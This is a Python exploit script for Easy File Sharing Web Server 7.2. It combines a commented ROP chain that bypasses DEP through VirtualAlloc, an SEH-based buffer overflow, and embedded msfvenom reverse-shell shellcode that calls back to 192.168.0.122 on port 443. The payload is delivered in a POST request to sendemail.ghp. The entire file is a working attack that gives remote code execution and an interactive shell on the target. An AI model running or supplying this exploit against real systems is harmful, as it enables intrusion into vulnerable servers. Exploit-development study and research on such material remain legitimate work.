#!/usr/bin/python3

# Easy File Sharing Web Server 7.2 [DEP Bypass]
# William Moody
# 28.06.2021

import sys
import requests
from struct import pack

if len(sys.argv) != 2:
    print("Usage: %s server" % sys.argv[0])
    sys.exit(1)

server = sys.argv[1]
port = 80

# ===
# 10000000  10050000    ImageLoad   /SafeSEH OFF    C:\EFS Software\Easy File Sharing Web Server\ImageLoad.dll
# 61c00000  61c99000    sqlite3     /SafeSEH OFF    C:\EFS Software\Easy File Sharing Web Server\sqlite3.dll

ropSize = 1124

rop = b"".join(pack("<I", _) for _ in [
# First we need to clear ECX
    
    0x10022fcc, # pop ecx
    0xffffffff, # -- (-1)
    0x61c68081, # inc ecx ; add al, 0x39 ; ret

# Next we put the address of a writeable code cave into eax

    0x10015442, # pop eax ; ret
    0x1002bb04, # -- PAGE_WRITECOPY .data address in ImageLoad.dll

# Finally we can store the value of ESP in ESI

    0x10022c40, # mov edx, eax ; xor eax, eax ; and cl, 0x1F ; shl edx, cl ; ret
    0x100238cc, # push esp ; and al, 0x10 ; pop esi ; mov [edx], ecx ; ret

# Get the address of the dummy call in EAX (ESI + 0x448)

    0x1001f595, # mov eax, esi ; pop esi ; ret
    0xffffffff, # -- junk for pop esi
    0x10022fcc, # pop ecx
    0xfffffbb8, # -- (0 - 0x448)
    0x1001283e, # sub eax, ecx ; ret

# Clear ECX

    0x10022fcc, # pop ecx
    0xffffffff, # -- (-1)
    0x61c18d81, # xchg eax, edi ; ret
    0x61c68081, # inc ecx ; add al, 0x39 ; ret
    0x61c18d81, # xchg eax, edi ; ret

# Set ESI to a writeable code cave - 0xc

    0x1002397c, # pop esi ; ret
    0x1002baf8, # -- PAGE_WRITECOPY .data address in ImageLoad.dll - 0xc

# Move the address of the dummy call into ECX

    0x1001cca4, # or ecx, eax ; mov [esi+0xc], ecx ; pop edi ; or eax, 0xFFFFFFFF ; pop esi ; ret
    0xffffffff, # -- junk for pop edi
    0xffffffff, # -- junk for pop esi

# Dereference the IAT entry of VirtualAlloc (in EAX)

    0x10015442, # pop eax ; ret
    0x1004d1fc, # (IAT) Kernel32!VirtualAllocStub
    0x1002248c, # mov eax, [eax] ; ret

# Write the address of VirtualAlloc into the dummy call

    0x1001da08, # mov [ecx], eax ; ret

# Move ECX to the next dummy parameter

    0x61c68081, # inc ecx ; add al, 0x39 ; ret
    0x61c68081, # inc ecx ; add al, 0x39 ; ret
    0x61c68081, # inc ecx ; add al, 0x39 ; ret
    0x61c68081, # inc ecx ; add al, 0x39 ; ret

# Get the address of our shellcode in EAX (ECX+0x18)

    0x10015442, # pop eax ; ret
    0xffffffec, # -- (0 - 14)
    0x1001641c, # sub eax, ecx ; ret
    0x100231d1, # neg eax ; ret

# Write the address of our shellcode into the dummy call

    0x1001da08, # mov [ecx], eax ; ret

# Save our shellcode address in EDI temporarily 

    0x61c18d81, # xchg eax, edi ; ret

# Move ECX to the next dummy parameter

    0x61c68081, # inc ecx ; add al, 0x39 ; ret
    0x61c68081, # inc ecx ; add al, 0x39 ; ret
    0x61c68081, # inc ecx ; add al, 0x39 ; ret
    0x61c68081, # inc ecx ; add al, 0x39 ; ret

# Restore our shellcode address back into EAX

    0x61c18d81, # xchg eax, edi ; ret

# Write the address of our shellcode into the dummy call

    0x1001da08, # mov [ecx], eax ; ret

# Move ECX to the next dummy parameter

    0x61c68081, # inc ecx ; add al, 0x39 ; ret
    0x61c68081, # inc ecx ; add al, 0x39 ; ret
    0x61c68081, # inc ecx ; add al, 0x39 ; ret
    0x61c68081, # inc ecx ; add al, 0x39 ; ret

# Set EAX to 1

    0x10015442, # pop eax ; ret
    0xffffffff, # -- (-1)
    0x100231d1, # neg eax ; ret

# Write -1 to the dwSize parameter of the dummy call

    0x1001da08, # mov [ecx], eax ; ret

# Move ECX to the next dummy parameter

    0x61c68081, # inc ecx ; add al, 0x39 ; ret
    0x61c68081, # inc ecx ; add al, 0x39 ; ret
    0x61c68081, # inc ecx ; add al, 0x39 ; ret
    0x61c68081, # inc ecx ; add al, 0x39 ; ret

# Set EAX to 0x1000

    0x10015442, # pop eax ; ret
    0xffffefff, # -- (-1001)
    0x10022199, # inc eax ; ret
    0x100231d1, # neg eax ; ret

# Write the flAllocationType parameter of the dummy call

    0x1001da08, # mov [ecx], eax ; ret

# Move ECX to the next dummy parameter

    0x61c68081, # inc ecx ; add al, 0x39 ; ret
    0x61c68081, # inc ecx ; add al, 0x39 ; ret
    0x61c68081, # inc ecx ; add al, 0x39 ; ret
    0x61c68081, # inc ecx ; add al, 0x39 ; ret

# Set EAX to 0x40

    0x10015442, # pop eax ; ret
    0xffffffc0, # -- (-40)
    0x100231d1, # neg eax ; ret

# Write the flProtect parameter of the dummy call

    0x1001da08, # mov [ecx], eax ; ret

# Align ESP to the beginning of the dummy call (ECX-0x14)

    0x10015442, # pop eax ; ret
    0xffffffec, # -- (0 - 14)
    0x100231d1, # neg eax ; ret
    0x1001641c, # sub eax, ecx ; ret
    0x100231d1, # neg eax ; ret
    0x61c40763, # xchg eax, esp ; ret

])

# ===
# Dummy VirtualAlloc call

dummy  = b"aaaa" # VirtualAlloc
dummy += b"bbbb" # Function Return Address <- shellcode addr
dummy += b"cccc" # lpAddress <- shellcode addr
dummy += b"dddd" # dwSize <- 0x1 - 0x1000
dummy += b"eeee" # flAllocationType <- 0x1000
dummy += b"ffff" # flProtect <- 0x40

# ===
# msfvenom -f python -v shell -b "\x00\x25\x2b" -p windows/shell_reverse_tcp LHOST=192.168.0.122 LPORT=443

shell =  b"\x90" * 20
shell += b"\xdd\xc4\xba\x22\xe1\x6c\xf8\xd9\x74\x24\xf4\x5e"
shell += b"\x29\xc9\xb1\x52\x31\x56\x17\x83\xee\xfc\x03\x74"
shell += b"\xf2\x8e\x0d\x84\x1c\xcc\xee\x74\xdd\xb1\x67\x91"
shell += b"\xec\xf1\x1c\xd2\x5f\xc2\x57\xb6\x53\xa9\x3a\x22"
shell += b"\xe7\xdf\x92\x45\x40\x55\xc5\x68\x51\xc6\x35\xeb"
shell += b"\xd1\x15\x6a\xcb\xe8\xd5\x7f\x0a\x2c\x0b\x8d\x5e"
shell += b"\xe5\x47\x20\x4e\x82\x12\xf9\xe5\xd8\xb3\x79\x1a"
shell += b"\xa8\xb2\xa8\x8d\xa2\xec\x6a\x2c\x66\x85\x22\x36"
shell += b"\x6b\xa0\xfd\xcd\x5f\x5e\xfc\x07\xae\x9f\x53\x66"
shell += b"\x1e\x52\xad\xaf\x99\x8d\xd8\xd9\xd9\x30\xdb\x1e"
shell += b"\xa3\xee\x6e\x84\x03\x64\xc8\x60\xb5\xa9\x8f\xe3"
shell += b"\xb9\x06\xdb\xab\xdd\x99\x08\xc0\xda\x12\xaf\x06"
shell += b"\x6b\x60\x94\x82\x37\x32\xb5\x93\x9d\x95\xca\xc3"
shell += b"\x7d\x49\x6f\x88\x90\x9e\x02\xd3\xfc\x53\x2f\xeb"
shell += b"\xfc\xfb\x38\x98\xce\xa4\x92\x36\x63\x2c\x3d\xc1"
shell += b"\x84\x07\xf9\x5d\x7b\xa8\xfa\x74\xb8\xfc\xaa\xee"
shell += b"\x69\x7d\x21\xee\x96\xa8\xe6\xbe\x38\x03\x47\x6e"
shell += b"\xf9\xf3\x2f\x64\xf6\x2c\x4f\x87\xdc\x44\xfa\x72"
shell += b"\xb7\xaa\x53\x7c\x3d\x43\xa6\x7c\xc0\x28\x2f\x9a"
shell += b"\xa8\x5e\x66\x35\x45\xc6\x23\xcd\xf4\x07\xfe\xa8"
shell += b"\x37\x83\x0d\x4d\xf9\x64\x7b\x5d\x6e\x85\x36\x3f"
shell += b"\x39\x9a\xec\x57\xa5\x09\x6b\xa7\xa0\x31\x24\xf0"
shell += b"\xe5\x84\x3d\x94\x1b\xbe\x97\x8a\xe1\x26\xdf\x0e"
shell += b"\x3e\x9b\xde\x8f\xb3\xa7\xc4\x9f\x0d\x27\x41\xcb"
shell += b"\xc1\x7e\x1f\xa5\xa7\x28\xd1\x1f\x7e\x86\xbb\xf7"
shell += b"\x07\xe4\x7b\x81\x07\x21\x0a\x6d\xb9\x9c\x4b\x92"
shell += b"\x76\x49\x5c\xeb\x6a\xe9\xa3\x26\x2f\x19\xee\x6a"
shell += b"\x06\xb2\xb7\xff\x1a\xdf\x47\x2a\x58\xe6\xcb\xde"
shell += b"\x21\x1d\xd3\xab\x24\x59\x53\x40\x55\xf2\x36\x66"
shell += b"\xca\xf3\x12"

# ===
# Bad chars = \x00 \x25 \x2b

buf = b"A" * 2536                  # offset
buf += rop                         # rop chain
buf += b"A" * (ropSize - len(rop)) # offset
buf += dummy                       # dummy call
buf += shell                       # shellcode
buf += b"A" * (4060 - len(buf))    # offset
buf += b"B" * 4                    # nSeh
buf += pack("<I", 0x10022877)      # (seh) add esp, 0x1004 ; ret
buf += b"D" * (5000 - len(buf))    # padding to trigger seh overflow

# ===
# Make sure there are no bad chars in the buffer

for bad in b"\x00\x25\x2b":
    assert bad not in buf

# ===
# Send the payload

print("-- ROP chain takes %d/%d bytes." % (len(rop), ropSize))
print("-- Shell takes %d bytes." % len(shell))
print()
print("[+] Sending request...")

requests.post("http://%s:%d/sendemail.ghp" % (server, port),
    headers={"Content-Type": "application/x-www-form-urlencoded"},
    data=b"Email=%s&getPassword=Get+Password" % buf)